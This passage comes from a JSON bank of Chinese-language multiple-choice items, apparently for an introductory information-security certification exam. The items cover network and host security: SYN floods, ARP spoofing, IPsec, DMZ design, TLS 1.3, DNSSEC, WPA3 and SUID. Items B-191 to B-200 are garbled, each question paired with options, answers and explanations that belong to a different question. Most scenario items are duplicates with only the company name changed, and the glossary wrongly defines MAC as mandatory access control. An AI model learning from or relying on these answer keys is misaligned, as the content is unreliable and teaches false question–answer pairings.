    "question": "某金流與行動支付科技公司近期網路對外服務頻繁中斷，經網路管理員抓包分析，發現伺服器收到大量僅有 TCP SYN 旗標卻始終未完成後續 ACK 回應的半開連線，導致連線狀態表全數耗盡。此攻擊型態為：",
    "options": [
      "A. Land 偽造攻擊",
      "B. UDP Fraggle 攻擊",
      "C. Smurf ICMP 放大攻擊",
      "D. TCP SYN Flood 阻斷服務攻擊"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "SYN Flood 送出大量 SYN 卻不回應 ACK，耗盡受害伺服器的 TCP backlog queue 半開連線佇列。",
    "trap": "防禦通常啟用 SYN Cookies 或防火牆連線防護。",
    "law": "RFC 4987"
  },
  {
    "id": "IPAS-B-172",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某公務機關資訊處內部同仁回報連線至內部入口網頁時，瀏覽器出現偽造網頁，經查發現攻擊者在區域網路中發送大量偽造之 ARP Reply 封包，將預設閘道（Gateway）IP 對應至攻擊者網卡 MAC。為根絕此攻擊，網管應在交換器啟用何種功能？",
    "options": [
      "A. 停用交換器生成樹協定（STP）",
      "B. 動態 ARP 檢驗（DAI, Dynamic ARP Inspection）結合 DHCP Snooping",
      "C. 啟用巨型訊框（Jumbo Frame）",
      "D. 改用靜態路由協定 RIP"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "MAC",
        "zh": "強制存取控制",
        "ipa": "/mæk/"
      }
    ],
    "explanation": "DAI 透過比對 DHCP Snooping 綁定表，阻擋未授權或偽造的 ARP 封包，徹底防止 ARP 欺騙。",
    "trap": "單純在端點設靜態 ARP 維護成本高且難以全面覆蓋，交換器 DAI 為標準企業解法。",
    "law": "Cisco / IEEE 802.1Q 安全規範"
  },
  {
    "id": "IPAS-B-173",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某大型連鎖量販流通集團規劃於總部與海外分公司之間建立點對點（Site-to-Site）安全通道，若要求傳輸過程中連同原始 IP 標頭（Header）也必須全數加密並封裝進新 IP 標頭中，IPsec 應配置為哪種模式？",
    "options": [
      "A. 通道模式（Tunnel Mode）",
      "B. 橋接模式（Bridged Mode）",
      "C. 路由模式（Routed Mode）",
      "D. 傳輸模式（Transport Mode）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "IPsec",
        "zh": "網際網路安全通訊協定",
        "ipa": "/ˈaɪ.piː.sek/"
      }
    ],
    "explanation": "Tunnel Mode 會將整個原始 IP 封包（含標頭）全部加密，並加上新的外部 IP 標頭；Transport Mode 僅加密負載（Payload）而保留原標頭。",
    "trap": "Site-to-Site VPN 標準皆使用 Tunnel Mode。",
    "law": "RFC 4301"
  },
  {
    "id": "IPAS-B-174",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某國立頂尖研究型大學對外提供公眾服務之官方 Web 伺服器，依據安全架構最佳實務，應部署於網路拓撲之何處？",
    "options": [
      "A. 位於外部網際網路與內部網路之間的 DMZ（非軍事區）",
      "B. 員工專用無線訪客網段",
      "C. 內部最核心機密資料庫網段（LAN）",
      "D. 網管專屬帶外管理網段（OOBM）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "DMZ",
        "zh": "非軍事區 / 隔離網段",
        "ipa": "/ˌdiː.emˈziː/"
      }
    ],
    "explanation": "公開 Web 伺服器易遭外部滲透，必須置於 DMZ 進行風險隔離，防止被入侵後直接威脅內部核心資料。",
    "trap": "絕不可將對外 Web 伺服器直接放置於內網核心區。",
    "law": "NIST SP 800-41"
  },
  {
    "id": "IPAS-B-175",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商資安團隊在審查防火牆進出規則時，發現規則庫中允許由 DMZ 區的 Web 伺服器主動向內部核心資料庫（LAN）發起 Port 1433 連線。資安顧問指出此設定違反了 DMZ 核心原則，其主要考量為何？",
    "options": [
      "A. DMZ 區不支援傳輸層協定",
      "B. 若 DMZ 主機遭攻陷，攻擊者可藉此主動通道直接橫向滲透內部資料庫",
      "C. 資料庫無法回應 DMZ 的 TCP 請求",
      "D. 會造成防火牆頻寬嚴重下降"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "DMZ",
        "zh": "非軍事區 / 隔離網段",
        "ipa": "/ˌdiː.emˈziː/"
      }
    ],
    "explanation": "DMZ 鐵律：DMZ 伺服器絕不可主動建立連往內網的連線，連線只能由內網發起或經由嚴密受控的反向代理存取。",
    "trap": "此為防範內網橫向移動（Lateral Movement）之核心設計。",
    "law": "NIST SP 800-41"
  },
  {
    "id": "IPAS-B-176",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某跨國金融控股銀行為提升跨網際網路連線之傳輸安全，決定全面升級至 TLS 1.3。相較於舊版 TLS 1.2，下列何者為 TLS 1.3 的重大安全改進？",
    "options": [
      "A. 廢除所有數位憑證驗證",
      "B. 移除不安全的老舊加密演算法，並強制採用具前向保密性（PFS）的密鑰交換",
      "C. 取消所有非對稱加密交握",
      "D. 允許純文字明文傳輸以加快速度"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      },
      {
        "en": "RSA",
        "zh": "RSA 非對稱加密演算法",
        "ipa": "/ˌɑːr.esˈeɪ/"
      }
    ],
    "explanation": "TLS 1.3 刪除了 RSA 金鑰傳輸、RC4、DES、SHA-1 等老舊密碼套件，強制要求 ECDHE 等前向保密金鑰交換，並將交握縮短為 1-RTT。",
    "trap": "TLS 1.3 大幅提升安全性與速度，絕非降低加密要求。",
    "law": "RFC 8446"
  },
  {
    "id": "IPAS-B-177",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某金流與行動支付科技公司網路工程師在分析外部 DNS 查詢異常時，發現攻擊者利用快取污染（Cache Poisoning）將員工引導至釣魚網站。為確保 DNS 回應內容未遭竄改且來源可信，最佳解決方案為啟用：",
    "options": [
      "A. DNS 穿隧（DNS Tunneling）",
      "B. DNSSEC（網域名稱安全延伸協定）",
      "C. 動態 DNS（DDNS）",
      "D. 靜態 HOSTS 檔案分發"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "DNS Tunneling",
        "zh": "DNS 穿隧通訊",
        "ipa": "/ˌdiː.enˈes ˈtʌn.əl.ɪŋ/"
      },
      {
        "en": "DNSSEC",
        "zh": "網域名稱安全擴充協定",
        "ipa": "/ˌdiː.en.esˈsek/"
      }
    ],
    "explanation": "DNSSEC 透過公開金鑰密碼學為 DNS 資源紀錄提供數位簽章，驗證來源真實性與紀錄完整性，防範 DNS 快取毒化。",
    "trap": "DNSSEC 保障的是查詢結果真偽，不提供內容隱私加密（DoH/DoT 才是加密內容）。",
    "law": "RFC 4033"
  },
  {
    "id": "IPAS-B-178",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某金流與行動支付科技公司資安巡檢時發現某台邊界伺服器對網際網路開放了預設的遠端桌面連接埠，極易招致暴力破解攻擊。該遠端桌面通訊埠（RDP）預設為哪一個 Port？",
    "options": [
      "A. TCP 80",
      "B. TCP 22",
      "C. TCP 3389",
      "D. TCP 443"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "Windows 遠端桌面（RDP）預設連接埠為 TCP 3389；SSH 為 22；HTTPS 為 443；HTTP 為 80。",
    "trap": "對外開放 3389 經常引來暴力破解與勒索軟體入侵。",
    "law": "IANA 連接埠分配標準"
  },
  {
    "id": "IPAS-B-179",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某知名大型網路電商平台辦公室全面汰換老舊無線基地台（AP），為徹底防範針對 WPA2 Pre-Shared Key (PSK) 的 4-way handshake 離線字典檔重播破解，應優先採用何種最新無線安全認證標準？",
    "options": [
      "A. WPA3-Personal（採用 SAE 機制）",
      "B. 隱藏 SSID 廣播",
      "C. WPA2-Enterprise",
      "D. WEP 128-bit"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "WPA3 採用 SAE（對等實體同步驗證）取代 WPA2 的 PSK 四向交握，能有效抵抗離線字典檔暴力破解與前向保密攻擊。",
    "trap": "隱藏 SSID 並非加密標準且無法防範嗅探。",
    "law": "Wi-Fi Alliance WPA3 規範"
  },
  {
    "id": "IPAS-B-180",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心內部多台主機私自架設未授權 DHCP 伺服器，導致員工取得錯誤 Gateway IP。交換器應啟用何種安全技術以阻絕未授權 DHCP Offer？",
    "options": [
      "A. 開放所有交換器連接埠",
      "B. DHCP Snooping（將合法伺服器埠設為 Trusted，其餘為 Untrusted）",
      "C. 啟用 RIP 路由更新",
      "D. 關閉全網廣播封包"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "DHCP Snooping 可指定只有連接合法 DHCP 伺服器的 Port 為信任埠，其餘埠若發送 DHCP Offer 封包一律丟棄。",
    "trap": "能防止 Rogue DHCP Server 派發惡意 Gateway 與 DNS。",
    "law": "IEEE 802.1D"
  },
  {
    "id": "IPAS-B-181",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團近期網路對外服務頻繁中斷，經網路管理員抓包分析，發現伺服器收到大量僅有 TCP SYN 旗標卻始終未完成後續 ACK 回應的半開連線，導致連線狀態表全數耗盡。此攻擊型態為：",
    "options": [
      "A. Land 偽造攻擊",
      "B. UDP Fraggle 攻擊",
      "C. TCP SYN Flood 阻斷服務攻擊",
      "D. Smurf ICMP 放大攻擊"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "SYN Flood 送出大量 SYN 卻不回應 ACK，耗盡受害伺服器的 TCP backlog queue 半開連線佇列。",
    "trap": "防禦通常啟用 SYN Cookies 或防火牆連線防護。",
    "law": "RFC 4987"
  },
  {
    "id": "IPAS-B-182",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商內部同仁回報連線至內部入口網頁時，瀏覽器出現偽造網頁，經查發現攻擊者在區域網路中發送大量偽造之 ARP Reply 封包，將預設閘道（Gateway）IP 對應至攻擊者網卡 MAC。為根絕此攻擊，網管應在交換器啟用何種功能？",
    "options": [
      "A. 啟用巨型訊框（Jumbo Frame）",
      "B. 動態 ARP 檢驗（DAI, Dynamic ARP Inspection）結合 DHCP Snooping",
      "C. 停用交換器生成樹協定（STP）",
      "D. 改用靜態路由協定 RIP"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "MAC",
        "zh": "強制存取控制",
        "ipa": "/mæk/"
      }
    ],
    "explanation": "DAI 透過比對 DHCP Snooping 綁定表，阻擋未授權或偽造的 ARP 封包，徹底防止 ARP 欺騙。",
    "trap": "單純在端點設靜態 ARP 維護成本高且難以全面覆蓋，交換器 DAI 為標準企業解法。",
    "law": "Cisco / IEEE 802.1Q 安全規範"
  },
  {
    "id": "IPAS-B-183",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商規劃於總部與海外分公司之間建立點對點（Site-to-Site）安全通道，若要求傳輸過程中連同原始 IP 標頭（Header）也必須全數加密並封裝進新 IP 標頭中，IPsec 應配置為哪種模式？",
    "options": [
      "A. 通道模式（Tunnel Mode）",
      "B. 傳輸模式（Transport Mode）",
      "C. 路由模式（Routed Mode）",
      "D. 橋接模式（Bridged Mode）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "IPsec",
        "zh": "網際網路安全通訊協定",
        "ipa": "/ˈaɪ.piː.sek/"
      }
    ],
    "explanation": "Tunnel Mode 會將整個原始 IP 封包（含標頭）全部加密，並加上新的外部 IP 標頭；Transport Mode 僅加密負載（Payload）而保留原標頭。",
    "trap": "Site-to-Site VPN 標準皆使用 Tunnel Mode。",
    "law": "RFC 4301"
  },
  {
    "id": "IPAS-B-184",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某金流與行動支付科技公司對外提供公眾服務之官方 Web 伺服器，依據安全架構最佳實務，應部署於網路拓撲之何處？",
    "options": [
      "A. 員工專用無線訪客網段",
      "B. 內部最核心機密資料庫網段（LAN）",
      "C. 網管專屬帶外管理網段（OOBM）",
      "D. 位於外部網際網路與內部網路之間的 DMZ（非軍事區）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "DMZ",
        "zh": "非軍事區 / 隔離網段",
        "ipa": "/ˌdiː.emˈziː/"
      }
    ],
    "explanation": "公開 Web 伺服器易遭外部滲透，必須置於 DMZ 進行風險隔離，防止被入侵後直接威脅內部核心資料。",
    "trap": "絕不可將對外 Web 伺服器直接放置於內網核心區。",
    "law": "NIST SP 800-41"
  },
  {
    "id": "IPAS-B-185",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某知名大型網路電商平台資安團隊在審查防火牆進出規則時，發現規則庫中允許由 DMZ 區的 Web 伺服器主動向內部核心資料庫（LAN）發起 Port 1433 連線。資安顧問指出此設定違反了 DMZ 核心原則，其主要考量為何？",
    "options": [
      "A. 資料庫無法回應 DMZ 的 TCP 請求",
      "B. 若 DMZ 主機遭攻陷，攻擊者可藉此主動通道直接橫向滲透內部資料庫",
      "C. 會造成防火牆頻寬嚴重下降",
      "D. DMZ 區不支援傳輸層協定"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "DMZ",
        "zh": "非軍事區 / 隔離網段",
        "ipa": "/ˌdiː.emˈziː/"
      }
    ],
    "explanation": "DMZ 鐵律：DMZ 伺服器絕不可主動建立連往內網的連線，連線只能由內網發起或經由嚴密受控的反向代理存取。",
    "trap": "此為防範內網橫向移動（Lateral Movement）之核心設計。",
    "law": "NIST SP 800-41"
  },
  {
    "id": "IPAS-B-186",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心為提升跨網際網路連線之傳輸安全，決定全面升級至 TLS 1.3。相較於舊版 TLS 1.2，下列何者為 TLS 1.3 的重大安全改進？",
    "options": [
      "A. 移除不安全的老舊加密演算法，並強制採用具前向保密性（PFS）的密鑰交換",
      "B. 廢除所有數位憑證驗證",
      "C. 取消所有非對稱加密交握",
      "D. 允許純文字明文傳輸以加快速度"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      },
      {
        "en": "RSA",
        "zh": "RSA 非對稱加密演算法",
        "ipa": "/ˌɑːr.esˈeɪ/"
      }
    ],
    "explanation": "TLS 1.3 刪除了 RSA 金鑰傳輸、RC4、DES、SHA-1 等老舊密碼套件，強制要求 ECDHE 等前向保密金鑰交換，並將交握縮短為 1-RTT。",
    "trap": "TLS 1.3 大幅提升安全性與速度，絕非降低加密要求。",
    "law": "RFC 8446"
  },
  {
    "id": "IPAS-B-187",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某大型連鎖量販流通集團網路工程師在分析外部 DNS 查詢異常時，發現攻擊者利用快取污染（Cache Poisoning）將員工引導至釣魚網站。為確保 DNS 回應內容未遭竄改且來源可信，最佳解決方案為啟用：",
    "options": [
      "A. DNSSEC（網域名稱安全延伸協定）",
      "B. 靜態 HOSTS 檔案分發",
      "C. 動態 DNS（DDNS）",
      "D. DNS 穿隧（DNS Tunneling）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "DNS Tunneling",
        "zh": "DNS 穿隧通訊",
        "ipa": "/ˌdiː.enˈes ˈtʌn.əl.ɪŋ/"
      },
      {
        "en": "DNSSEC",
        "zh": "網域名稱安全擴充協定",
        "ipa": "/ˌdiː.en.esˈsek/"
      }
    ],
    "explanation": "DNSSEC 透過公開金鑰密碼學為 DNS 資源紀錄提供數位簽章，驗證來源真實性與紀錄完整性，防範 DNS 快取毒化。",
    "trap": "DNSSEC 保障的是查詢結果真偽，不提供內容隱私加密（DoH/DoT 才是加密內容）。",
    "law": "RFC 4033"
  },
  {
    "id": "IPAS-B-188",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心資安巡檢時發現某台邊界伺服器對網際網路開放了預設的遠端桌面連接埠，極易招致暴力破解攻擊。該遠端桌面通訊埠（RDP）預設為哪一個 Port？",
    "options": [
      "A. TCP 80",
      "B. TCP 3389",
      "C. TCP 22",
      "D. TCP 443"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "Windows 遠端桌面（RDP）預設連接埠為 TCP 3389；SSH 為 22；HTTPS 為 443；HTTP 為 80。",
    "trap": "對外開放 3389 經常引來暴力破解與勒索軟體入侵。",
    "law": "IANA 連接埠分配標準"
  },
  {
    "id": "IPAS-B-189",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某跨國金融控股銀行辦公室全面汰換老舊無線基地台（AP），為徹底防範針對 WPA2 Pre-Shared Key (PSK) 的 4-way handshake 離線字典檔重播破解，應優先採用何種最新無線安全認證標準？",
    "options": [
      "A. WEP 128-bit",
      "B. WPA3-Personal（採用 SAE 機制）",
      "C. 隱藏 SSID 廣播",
      "D. WPA2-Enterprise"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "WPA3 採用 SAE（對等實體同步驗證）取代 WPA2 的 PSK 四向交握，能有效抵抗離線字典檔暴力破解與前向保密攻擊。",
    "trap": "隱藏 SSID 並非加密標準且無法防範嗅探。",
    "law": "Wi-Fi Alliance WPA3 規範"
  },
  {
    "id": "IPAS-B-190",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商內部多台主機私自架設未授權 DHCP 伺服器，導致員工取得錯誤 Gateway IP。交換器應啟用何種安全技術以阻絕未授權 DHCP Offer？",
    "options": [
      "A. 啟用 RIP 路由更新",
      "B. 關閉全網廣播封包",
      "C. DHCP Snooping（將合法伺服器埠設為 Trusted，其餘為 Untrusted）",
      "D. 開放所有交換器連接埠"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "DHCP Snooping 可指定只有連接合法 DHCP 伺服器的 Port 為信任埠，其餘埠若發送 DHCP Offer 封包一律丟棄。",
    "trap": "能防止 Rogue DHCP Server 派發惡意 Gateway 與 DNS。",
    "law": "IEEE 802.1D"
  },
  {
    "id": "IPAS-B-191",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": false,
    "question": "TCP 通訊協定建立連線所採用的「三向交握（Three-Way Handshake）」，其標準封包旗標發送順序為何？",
    "options": [
      "A. TCP SYN Flood 阻斷服務攻擊",
      "B. UDP Fraggle 攻擊",
      "C. Smurf ICMP 放大攻擊",
      "D. Land 偽造攻擊"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "SYN Flood 送出大量 SYN 卻不回應 ACK，耗盡受害伺服器的 TCP backlog queue 半開連線佇列。",
    "trap": "防禦通常啟用 SYN Cookies 或防火牆連線防護。",
    "law": "RFC 4987"
  },
  {
    "id": "IPAS-B-192",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": false,
    "question": "在區域網路中，攻擊者透過廣播偽造的 MAC 與 IP 對應關係，藉此攔截或監聽網段內其他電腦通訊之手法稱為：",
    "options": [
      "A. 啟用巨型訊框（Jumbo Frame）",
      "B. 動態 ARP 檢驗（DAI, Dynamic ARP Inspection）結合 DHCP Snooping",
      "C. 改用靜態路由協定 RIP",
      "D. 停用交換器生成樹協定（STP）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "MAC",
        "zh": "強制存取控制",
        "ipa": "/mæk/"
      }
    ],
    "explanation": "DAI 透過比對 DHCP Snooping 綁定表，阻擋未授權或偽造的 ARP 封包，徹底防止 ARP 欺騙。",
    "trap": "單純在端點設靜態 ARP 維護成本高且難以全面覆蓋，交換器 DAI 為標準企業解法。",
    "law": "Cisco / IEEE 802.1Q 安全規範"
  },
  {
    "id": "IPAS-B-193",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": false,
    "question": "關於 IPsec 協定架構中的「封裝安全酬載（ESP, Encapsulating Security Payload）」，其能提供下列何種安全服務？",
    "options": [
      "A. 路由模式（Routed Mode）",
      "B. 通道模式（Tunnel Mode）",
      "C. 橋接模式（Bridged Mode）",
      "D. 傳輸模式（Transport Mode）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "IPsec",
        "zh": "網際網路安全通訊協定",
        "ipa": "/ˈaɪ.piː.sek/"
      }
    ],
    "explanation": "Tunnel Mode 會將整個原始 IP 封包（含標頭）全部加密，並加上新的外部 IP 標頭；Transport Mode 僅加密負載（Payload）而保留原標頭。",
    "trap": "Site-to-Site VPN 標準皆使用 Tunnel Mode。",
    "law": "RFC 4301"
  },
  {
    "id": "IPAS-B-194",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": false,
    "question": "在企業網路防火牆架構中，DMZ（非軍事區）的主要設置目的為何？",
    "options": [
      "A. 員工專用無線訪客網段",
      "B. 位於外部網際網路與內部網路之間的 DMZ（非軍事區）",
      "C. 網管專屬帶外管理網段（OOBM）",
      "D. 內部最核心機密資料庫網段（LAN）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "DMZ",
        "zh": "非軍事區 / 隔離網段",
        "ipa": "/ˌdiː.emˈziː/"
      }
    ],
    "explanation": "公開 Web 伺服器易遭外部滲透，必須置於 DMZ 進行風險隔離，防止被入侵後直接威脅內部核心資料。",
    "trap": "絕不可將對外 Web 伺服器直接放置於內網核心區。",
    "law": "NIST SP 800-41"
  },
  {
    "id": "IPAS-B-195",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": false,
    "question": "關於 TLS 1.3 協定之特性，下列敘述何者錯誤？",
    "options": [
      "A. 資料庫無法回應 DMZ 的 TCP 請求",
      "B. 若 DMZ 主機遭攻陷，攻擊者可藉此主動通道直接橫向滲透內部資料庫",
      "C. DMZ 區不支援傳輸層協定",
      "D. 會造成防火牆頻寬嚴重下降"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      },
      {
        "en": "DMZ",
        "zh": "非軍事區 / 隔離網段",
        "ipa": "/ˌdiː.emˈziː/"
      }
    ],
    "explanation": "DMZ 鐵律：DMZ 伺服器絕不可主動建立連往內網的連線，連線只能由內網發起或經由嚴密受控的反向代理存取。",
    "trap": "此為防範內網橫向移動（Lateral Movement）之核心設計。",
    "law": "NIST SP 800-41"
  },
  {
    "id": "IPAS-B-196",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": false,
    "question": "「網域名稱安全擴充協定（DNSSEC）」主要透過下列何種技術機制來確保 DNS 查詢回應的真實性與完整性？",
    "options": [
      "A. 取消所有非對稱加密交握",
      "B. 允許純文字明文傳輸以加快速度",
      "C. 移除不安全的老舊加密演算法，並強制採用具前向保密性（PFS）的密鑰交換",
      "D. 廢除所有數位憑證驗證"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "DNSSEC",
        "zh": "網域名稱安全擴充協定",
        "ipa": "/ˌdiː.en.esˈsek/"
      },
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      },
      {
        "en": "RSA",
        "zh": "RSA 非對稱加密演算法",
        "ipa": "/ˌɑːr.esˈeɪ/"
      }
    ],
    "explanation": "TLS 1.3 刪除了 RSA 金鑰傳輸、RC4、DES、SHA-1 等老舊密碼套件，強制要求 ECDHE 等前向保密金鑰交換，並將交握縮短為 1-RTT。",
    "trap": "TLS 1.3 大幅提升安全性與速度，絕非降低加密要求。",
    "law": "RFC 8446"
  },
  {
    "id": "IPAS-B-197",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": false,
    "question": "網際網路常見通訊協定與其預設使用之 TCP/UDP 連接埠（Port），下列配對何者正確？",
    "options": [
      "A. DNSSEC（網域名稱安全延伸協定）",
      "B. 靜態 HOSTS 檔案分發",
      "C. 動態 DNS（DDNS）",
      "D. DNS 穿隧（DNS Tunneling）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "DNS Tunneling",
        "zh": "DNS 穿隧通訊",
        "ipa": "/ˌdiː.enˈes ˈtʌn.əl.ɪŋ/"
      },
      {
        "en": "DNSSEC",
        "zh": "網域名稱安全擴充協定",
        "ipa": "/ˌdiː.en.esˈsek/"
      }
    ],
    "explanation": "DNSSEC 透過公開金鑰密碼學為 DNS 資源紀錄提供數位簽章，驗證來源真實性與紀錄完整性，防範 DNS 快取毒化。",
    "trap": "DNSSEC 保障的是查詢結果真偽，不提供內容隱私加密（DoH/DoT 才是加密內容）。",
    "law": "RFC 4033"
  },
  {
    "id": "IPAS-B-198",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": false,
    "question": "網路位址轉譯（NAT/PAT）技術在資安防護上的主要效益與限制為何？",
    "options": [
      "A. TCP 22",
      "B. TCP 80",
      "C. TCP 3389",
      "D. TCP 443"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "Windows 遠端桌面（RDP）預設連接埠為 TCP 3389；SSH 為 22；HTTPS 為 443；HTTP 為 80。",
    "trap": "對外開放 3389 經常引來暴力破解與勒索軟體入侵。",
    "law": "IANA 連接埠分配標準"
  },
  {
    "id": "IPAS-B-199",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": false,
    "question": "WPA3 無線安全標準引入「對等實體同步驗證（SAE, Simultaneous Authentication of Equals）」機制，主要解決了 WPA2 的何種缺陷？",
    "options": [
      "A. WPA2-Enterprise",
      "B. WEP 128-bit",
      "C. WPA3-Personal（採用 SAE 機制）",
      "D. 隱藏 SSID 廣播"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "WPA3 採用 SAE（對等實體同步驗證）取代 WPA2 的 PSK 四向交握，能有效抵抗離線字典檔暴力破解與前向保密攻擊。",
    "trap": "隱藏 SSID 並非加密標準且無法防範嗅探。",
    "law": "Wi-Fi Alliance WPA3 規範"
  },
  {
    "id": "IPAS-B-200",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "網路通訊協定與架構安全",
    "scenario": false,
    "question": "在第二層交換器（Layer 2 Switch）上，用以防止非授權使用者任意更換網卡 MAC 或串接集線器的防護技術稱為：",
    "options": [
      "A. 開放所有交換器連接埠",
      "B. 關閉全網廣播封包",
      "C. DHCP Snooping（將合法伺服器埠設為 Trusted，其餘為 Untrusted）",
      "D. 啟用 RIP 路由更新"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "MAC",
        "zh": "強制存取控制",
        "ipa": "/mæk/"
      }
    ],
    "explanation": "DHCP Snooping 可指定只有連接合法 DHCP 伺服器的 Port 為信任埠，其餘埠若發送 DHCP Offer 封包一律丟棄。",
    "trap": "能防止 Rogue DHCP Server 派發惡意 Gateway 與 DNS。",
    "law": "IEEE 802.1D"
  },
  {
    "id": "IPAS-B-201",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某區域教學醫學中心內部擁有超過 2,000 台 Windows 用戶端電腦，為確保全體電腦強制實施「螢幕保護程式密碼鎖定（10分鐘）」與「密碼長度至少 12 碼」，系統管理員應使用何種集中化管理工具推播？",
    "options": [
      "A. Active Directory 群組原則物件（GPO, Group Policy Object）",
      "B. 透過電子郵件寄送使用手冊",
      "C. 手動至每台電腦修改本機註冊表",
      "D. 撰寫批次檔由每位員工自行點擊執行"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "GPO 能在 Windows 網域環境中集中定義並強制派送安全設定至所有加入網域之電腦，具備強制性與一致性。",
    "trap": "手動或通知員工自行修改極易產生遺漏與合規死角。",
    "law": "微軟 AD DS 架構指南"
  },
  {
    "id": "IPAS-B-202",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "作業系統與主機端點安全",
    "scenario": true,
    "question": "某跨國金融控股銀行的 Linux 系統管理員在排查伺服器權限時，發現一個自訂指令稿被賦予了 `chmod 4755` 權限（帶有 SUID 標記）。該設定所帶來的潛在資安風險為何？",
    "options": [
      "A. 該檔案僅有 root 可以讀取",
      "B. 該檔案會自動刪除",
      "C. 任何一般使用者執行該檔案時，皆會暫時取得該檔案擁有者（通常為 root）之特權，若程式有漏洞易遭提權",
      "D. 該檔案將自動加密無法執行"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "SUID 讓執行者暫時獲得檔案擁有者的身分執行。若擁有者為 root 且該二進制程式存在缺陷，將淪為本機提權跳板。",
